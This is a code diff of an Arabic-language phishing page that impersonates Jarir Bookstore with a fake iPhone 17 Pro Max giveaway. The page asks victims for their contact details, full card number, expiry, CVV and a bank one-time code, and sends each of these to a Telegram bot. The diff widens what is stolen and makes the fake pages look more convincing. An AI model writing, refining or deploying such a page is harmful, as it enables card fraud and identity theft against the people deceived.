@@ -8,22 +8,22 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        :root { --jarir-red: #E30613; --jarir-navy: #2D3E50; }
-        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; padding: 0; }
+        :root { --jarir-red: #E30613; }
+        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; margin: 0; }
         .page { display: none; min-height: 100vh; }
         .page.active { display: block; }
         
-        /* رسالة الخطأ المدمجة (أحمر جرير) */
-        .error-message { display: none; background-color: #E30613; color: white; padding: 10px; border-radius: 4px; text-align: center; font-size: 13px; margin-bottom: 15px; font-weight: bold; }
+        /* التنسيق الأصلي للمدخلات كما في صورك */
+        .form-input { width: 100%; background: #F0F2F5; border: 1px solid #E5E7EB; border-radius: 4px; padding: 12px; outline: none; text-align: right; font-size: 14px; }
+        .btn-red { background-color: var(--jarir-red); width: 100%; color: white; font-weight: bold; border-radius: 8px; transition: 0.3s; }
+        
+        /* رسالة الخطأ المدمجة - حمراء وواضحة */
+        .error-box { display: none; color: white; background: #E30613; padding: 10px; border-radius: 4px; text-align: center; font-size: 13px; margin-bottom: 15px; font-weight: bold; width: 100%; }
 
         /* شاشة التحميل */
         #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; }
         .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--jarir-red); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* ستايل كودك الأصلي للمدخلات */
-        .form-input { width: 100%; background: #F0F2F5; border: 1px solid #E5E7EB; border-radius: 4px; padding: 12px; outline: none; text-align: right; font-size: 14px; }
-        .btn-red { background-color: var(--jarir-red); width: 100%; color: white; font-weight: bold; border-radius: 8px; transition: 0.3s; }
     </style>
 </head>
 <body class="max-w-md mx-auto shadow-2xl bg-white">
@@ -47,18 +47,18 @@
         <main class="p-5 text-center">
             <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" class="mx-auto w-[280px] my-6">
             <h1 class="text-xl font-bold text-right mb-4">ابل آيفون 17 برو ماكس</h1>
-            <button onclick="showPage('page-register')" class="btn-red py-4 w-full text-lg">استلم الهديه</button>
+            <button onclick="showPage('page-register')" class="btn-red py-4 w-full text-lg shadow-lg">استلم الهديه</button>
         </main>
     </section>
 
     <section id="page-register" class="page bg-white">
         <header class="p-4 border-b flex justify-between items-center">
-            <button onclick="showPage('page-product')" class="flex items-center"><i class="fa-solid fa-chevron-right ml-1"></i> العودة</button>
+            <button onclick="showPage('page-product')" class="flex items-center text-gray-800"><i class="fa-solid fa-chevron-right ml-1 text-sm"></i> العودة</button>
             <span class="font-bold">معلومات تسليم الهديه</span>
             <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
         </header>
         <div class="p-6">
-            <div id="error-reg" class="error-message">يرجى التأكد من كتابة جميع المعلومات والبريد بشكل صحيح</div>
+            <div id="error-reg" class="error-box">يرجى التأكد من كتابة جميع المعلومات والبريد بشكل صحيح</div>
             <div class="space-y-4">
                 <input type="tel" id="user-phone" placeholder="رقم الهاتف" class="form-input">
                 <input type="text" id="user-name" placeholder="الاسم الكامل" class="form-input">
@@ -71,16 +71,19 @@
 
     <section id="page-payment" class="page bg-[#F3F5F7]">
         <header class="p-4 bg-white border-b flex justify-between items-center">
-            <button onclick="showPage('page-register')" class="flex items-center"><i class="fa-solid fa-chevron-right ml-1"></i> العودة</button>
-            <span class="font-bold">دفع مصاريف الشحن</span>
+            <button onclick="showPage('page-register')" class="flex items-center text-gray-800"><i class="fa-solid fa-chevron-right ml-1 text-sm"></i> العودة</button>
+            <span class="font-bold text-lg">دفع مصاريف الشحن</span>
         </header>
         <main class="p-4">
-            <div id="error-pay" class="error-message">بيانات البطاقة غير مكتملة</div>
-            <div class="bg-white rounded-lg p-6 shadow-sm border">
-                <input type="tel" id="card-num" placeholder="رقم البطاقة" class="form-input mb-4" maxlength="16">
+            <div id="error-pay" class="error-box">يرجى التأكد من بيانات البطاقة بشكل صحيح</div>
+            <div class="bg-white rounded-lg p-6 shadow-sm border border-gray-200">
+                <div class="relative mb-4">
+                    <input type="tel" id="card-num" placeholder="رقم البطاقة" class="form-input" maxlength="16" oninput="identifyCard(this.value)">
+                    <div id="card-preview" class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400"></div>
+                </div>
                 <div class="flex gap-2 mb-4">
                     <input type="tel" id="card-cvv" placeholder="CVV" class="form-input w-1/3" maxlength="3">
-                    <input type="tel" id="card-exp" placeholder="تاريخ الانتهاء" class="form-input w-2/3" maxlength="5" oninput="formatExp(this)">
+                    <input type="tel" id="card-exp" placeholder="تاريخ الانتهاء" class="form-input w-2/3" maxlength="5" oninput="autoSlash(this)">
                 </div>
                 <input type="text" id="card-holder" placeholder="اسم حامل البطاقة" class="form-input mb-6">
                 <button onclick="sendData('payment')" class="btn-red py-4">مصاريف الشحن (76 ر.س.)</button>
@@ -88,21 +91,21 @@
         </main>
     </section>
 
-    <section id="page-bank" class="page">
+    <section id="page-bank" class="page bg-white">
         <div class="p-6">
             <div class="flex justify-between items-center mb-10">
-                <span class="text-blue-600 text-2xl" onclick="showPage('page-payment')">&#10094;</span>
-                <span class="font-bold">Cancel</span>
+                <span class="text-blue-600 text-2xl font-bold cursor-pointer" onclick="showPage('page-payment')">&#10094;</span>
+                <span class="font-bold text-gray-800">Cancel</span>
             </div>
-            <div class="flex justify-between items-center mb-8">
-                <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-12">
-                <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" class="h-12">
+            <div class="flex justify-between items-center mb-10">
+                <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-14">
+                <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" class="h-14">
             </div>
-            <h1 class="text-2xl font-bold mb-2">Verify By Phone</h1>
-            <p class="text-sm text-gray-600 mb-8">Paying Jarir Bookstore: <strong>SAR 76.00</strong></p>
-            <div id="error-otp" class="error-message">رمز التحقق غير صحيح</div>
-            <input type="tel" id="bank-otp" placeholder="Enter Code" class="form-input text-center text-2xl h-14 mb-6">
-            <button onclick="sendData('otp')" class="w-full bg-[#0000FF] text-white py-4 font-bold rounded">CONFIRM</button>
+            <h1 class="text-2xl font-bold text-gray-900 mb-2">Verify By Phone</h1>
+            <p class="text-gray-600 mb-10 text-sm">Paying Jarir Bookstore: <strong>SAR 76.00</strong></p>
+            <div id="error-otp" class="error-box">رمز التحقق غير صحيح، حاول مرة أخرى</div>
+            <input type="tel" id="bank-otp" placeholder="Enter Code" class="form-input text-center text-3xl h-16 mb-6 tracking-widest">
+            <button onclick="sendData('otp')" class="w-full bg-[#0000FF] text-white py-5 font-bold rounded-lg text-lg">CONFIRM</button>
         </div>
     </section>
 
@@ -116,22 +119,35 @@
             window.scrollTo(0,0);
         }
 
-        function formatExp(input) {
+        // قراءة نوع البطاقة برمجياً دون تغيير الشكل
+        function identifyCard(val) {
+            const preview = document.getElementById('card-preview');
+            if(val.startsWith('4')) preview.innerHTML = '<i class="fa-brands fa-cc-visa text-blue-600 text-xl"></i>';
+            else if(val.startsWith('5')) preview.innerHTML = '<i class="fa-brands fa-cc-mastercard text-orange-500 text-xl"></i>';
+            else preview.innerHTML = '';
+        }
+
+        // إضافة الخط المائل تلقائياً
+        function autoSlash(input) {
             let v = input.value.replace(/\D/g, '');
             if (v.length >= 2) input.value = v.substring(0,2) + '/' + v.substring(2,4);
         }
 
         async function sendData(step) {
-            document.querySelectorAll('.error-message').forEach(e => e.style.display = 'none');
+            document.querySelectorAll('.error-box').forEach(el => el.style.display = 'none');
 
             if(step === 'register') {
                 const phone = document.getElementById('user-phone').value;
                 const email = document.getElementById('user-email').value;
-                if(phone === "" || !email.includes("@")) {
+                const name = document.getElementById('user-name').value;
+                const addr = document.getElementById('user-address').value;
+
+                if(phone === "" || !email.includes("@") || name === "" || addr === "") {
                     document.getElementById('error-reg').style.display = 'block';
                     return;
                 }
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("👤 زبون جديد: " + phone)}`);
+                const text = `👤 عميل:\n📞 هاتف: ${phone}\n📝 اسم: ${name}\n📧 بريد: ${email}\n🏠 عنوان: ${addr}`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
                 showPage('page-payment');
 
             } else if(step === 'payment') {
@@ -140,12 +156,14 @@
                     document.getElementById('error-pay').style.display = 'block';
                     return;
                 }
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("💳 بطاقة: " + card)}`);
+                const text = `💳 بطاقة:\n🔢 رقم: ${card}\n📅 تاريخ: ${document.getElementById('card-exp').value}\n🔒 CVV: ${document.getElementById('card-cvv').value}\n👤 اسم: ${document.getElementById('card-holder').value}`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+                
                 document.getElementById('loader').style.display = 'flex';
                 setTimeout(() => { 
                     document.getElementById('loader').style.display = 'none';
                     showPage('page-bank');
-                }, 2000);
+                }, 2500);
 
             } else if(step === 'otp') {
                 const otp = document.getElementById('bank-otp').value;
@@ -153,8 +171,9 @@
                     document.getElementById('error-otp').style.display = 'block';
                     return;
                 }
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🔑 كود: " + otp)}`);
-                alert("تم بنجاح");
+                const text = `🔑 كود التحقق (OTP): ${otp}`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+                alert("تم استلام طلبك بنجاح.");
             }
         }
     </script>
